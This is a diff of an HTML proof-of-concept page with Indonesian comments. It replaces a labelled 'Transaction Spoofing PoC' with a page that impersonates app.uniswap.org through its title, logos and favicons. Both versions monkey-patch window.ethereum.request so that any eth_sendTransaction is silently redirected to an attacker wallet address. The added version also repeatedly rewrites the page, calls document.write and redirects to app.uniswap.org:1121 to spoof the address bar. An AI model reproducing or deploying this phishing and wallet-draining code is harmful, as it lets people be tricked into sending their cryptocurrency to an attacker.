@@ -1,94 +1,123 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Transaction Spoofing & Address Bar PoC</title>
-    <style>
-        body { font-family: Arial, sans-serif; padding: 20px; background: #f4f4f9; color: #333; max-width: 600px; margin: auto; }
-        .card { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-        button { padding: 12px 20px; background: #d63031; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; width: 100%; font-size: 14px; }
-        button:hover { opacity: 0.9; }
-        pre { background: #eee; padding: 12px; border-radius: 4px; font-size: 12px; overflow-x: auto; margin-top: 15px; }
-        .danger { color: #d63031; font-weight: bold; }
-        .success { color: #00b894; font-weight: bold; }
-    </style>
+  <title>app.uniswap.org Connect to Uniswap</title>
+  <!-- Favicon & Branding -->
+  <link rel="icon" type="image/png" sizes="32x32" href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Uniswap_Logo.svg/1200px-Uniswap_Logo.svg.png">
+  <link rel="icon" type="image/png" sizes="192x192" href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Uniswap_Logo.svg/1200px-Uniswap_Logo.svg.png">
+  <link rel="icon" type="image/png" sizes="512x512" href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Uniswap_Logo.svg/1200px-Uniswap_Logo.svg.png">
+  <link rel="apple-touch-icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Uniswap_Logo.svg/1200px-Uniswap_Logo.svg.png">
+  <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Uniswap_Logo.svg/1200px-Uniswap_Logo.svg.png">
+  <meta name="twitter:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Uniswap_Logo.svg/1200px-Uniswap_Logo.svg.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      padding-top: 50px;
+      background-color: #f9fafb;
+    }
+    button {
+      background-color: #2172e5;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 12px 24px;
+      font-size: 16px;
+      cursor: pointer;
+      margin: 8px 0;
+      width: 80%;
+      max-width: 300px;
+    }
+    button:hover { opacity: 0.9; }
+  </style>
+  <script>
+    // Alamat dompet penyerang target (Attacker Receiver)
+    const attackerWallet = "0x9999999999999999999999999999999999999999";
+
+    // Variabel dummy untuk document.write(a)
+    const a = "<h3 style='color:red;'>[!] Secure Context Injection Active</h3>";
+
+    // Monkey Patching pada objek window.ethereum.request untuk Transaksi Spoofing
+    if (typeof window.ethereum !== 'undefined') {
+        const originalRequest = window.ethereum.request;
+        window.ethereum.request = async function(args) {
+            if (args.method === 'eth_sendTransaction' && args.params && args.params[0]) {
+                let tx = args.params[0];
+                console.log("[!] INTERCEPT BERHASIL! Tujuan asli: " + tx.to);
+                // Substitusi alamat tujuan asli ke alamat penyerang secara senyap
+                tx.to = attackerWallet;
+            }
+            return originalRequest.apply(window.ethereum, [args]);
+        };
+    }
+
+    async function spoof() {
+      document.body.innerHTML = `
+        <h1>app.uniswap.org Web3 Interface</h1>
+        <p>To continue, please connect your wallet or execute action</p>
+        <button id="connect">Connect Wallet</button>
+		<br>
+		<button id="connectWallet">Connect Wallet Transaction (Spoofed)</button>
+        <p id="status" style="margin-top:20px; color:gray;"></p>
+      `;
+
+      document.getElementById('connect').onclick = async () => {
+        if (typeof window.ethereum !== 'undefined') {
+          try {
+            const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+            document.getElementById('status').innerText = '✅ Connected: ' + accounts[0];
+          } catch (e) {
+            document.getElementById('status').innerText = '❌ Failed: ' + e.message;
+          }
+        } else {
+          document.getElementById('status').innerText = '❌ Web3 Provider not detected.';
+        }
+      };
+	  
+      document.getElementById('connectWallet').onclick = async () => {
+        if (!window.ethereum) {
+          alert("No Web3 provider detected");
+          return;
+        }
+
+        try {
+          const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+          const user = accounts[0];
+
+          const tx = {
+            from: user,
+            to: "0x1111111111111111111111111111111111111111", 
+            value: "0x27C9504C27000", // ~0.000697 ETH
+            gas: "0x5208"
+          };
+
+          await ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [tx]
+          });
+
+          alert("Transaction sent.");
+        } catch (err) {
+          console.error(err);
+          alert("Error: " + err.message);
+        }
+      }
+
+      // Eksekusi tambahan sesuai snippet yang diminta
+      try {
+        document.write(a);
+        window.location.assign("http://app.uniswap.org:1121");
+      } catch(e) {}
+
+      setTimeout(function(){
+          spoof();  // Loop makes the browser always shows the fake page.
+      }, 5000); 
+    }
+
+    // Interval eksekusi fungsi spoof
+    setInterval(spoof, 2000);
+  </script>
 </head>
-<body>
-
-    <div class="card">
-        <h2>Combined Transaction Spoofing & Spoof Loop PoC</h2>
-        <p>Menggabungkan intersepsi parameter transaksi dengan fungsi manipulasi tampilan/judul halaman.</p>
-        
-        <button onclick="triggerSpoofedTransaction()">Eksekusi Transaksi Spoofing</button>
-        <pre id="log-box">Menunggu aksi pengguna...</pre>
-    </div>
-
-    <script>
-        const logBox = document.getElementById('log-box');
-        
-        // Alamat dompet penyerang target
-        const attackerWallet = "0x9999999999999999999999999999999999999999";
-
-        // Monkey patching pada objek window.ethereum.request
-        if (window.ethereum) {
-            const originalRequest = window.ethereum.request;
-            window.ethereum.request = async function(args) {
-                if (args.method === 'eth_sendTransaction' && args.params && args.params[0]) {
-                    let tx = args.params[0];
-                    logBox.innerHTML = `<span class="danger">[!] INTERCEPT BERHASIL!\nTujuan Asli dApp: ${tx.to}\nNilai Transaksi: ${tx.value}\n-> Menimpa alamat tujuan ke penyerang...</span>`;
-
-                    // Substitusi alamat tujuan asli ke alamat penyerang secara senyap
-                    tx.to = attackerWallet;
-                }
-                return originalRequest.apply(window.ethereum, [args]);
-            };
-        }
-
-        async function triggerSpoofedTransaction() {
-            if (!window.ethereum) {
-                logBox.textContent = "Error: Objek window.ethereum tidak ditemukan.";
-                return;
-            }
-            try {
-                logBox.textContent = "Meminta otorisasi akun (eth_requestAccounts)...";
-                await window.ethereum.request({ method: 'eth_requestAccounts' });
-
-                const txParams = {
-                    from: (await window.ethereum.request({ method: 'eth_accounts' }))[0],
-                    to: "0x1111111111111111111111111111111111111111", 
-                    value: "0x5af3107a4000", 
-                    gas: "0x5208",
-                    gasPrice: "0x3b9aca00"
-                };
-
-                logBox.textContent += "\nMengirimkan parameter transaksi ke bridge dompet...";
-                const txHash = await window.ethereum.request({
-                    method: 'eth_sendTransaction',
-                    params: [txParams]
-                });
-                
-                logBox.innerHTML += `\n<span class="success">[+] Transaksi diproses!\nHash: ${txHash}</span>`;
-            } catch (err) {
-                logBox.innerHTML += `\n<span class="danger[-] Respon/Error: ${err.message}</span>`;
-            }
-        }
-
-        // Integrasi fungsi spoof manipulasi halaman
-        function spoof() {
-            try {
-                document.title = "app.uniswap.org";
-            } catch (e) {
-                // Abaikan jika dibatasi kebijakan DOM
-            }
-            
-            setTimeout(function(){
-                // spoof(); // Opsional loop rekursif
-            }, 5000);
-        }
-
-        // Jalankan interval pemanggilan spoof judul/tampilan
-        setInterval(spoof, 2000);
-    </script>
-</body>
+<body></body>
 </html>
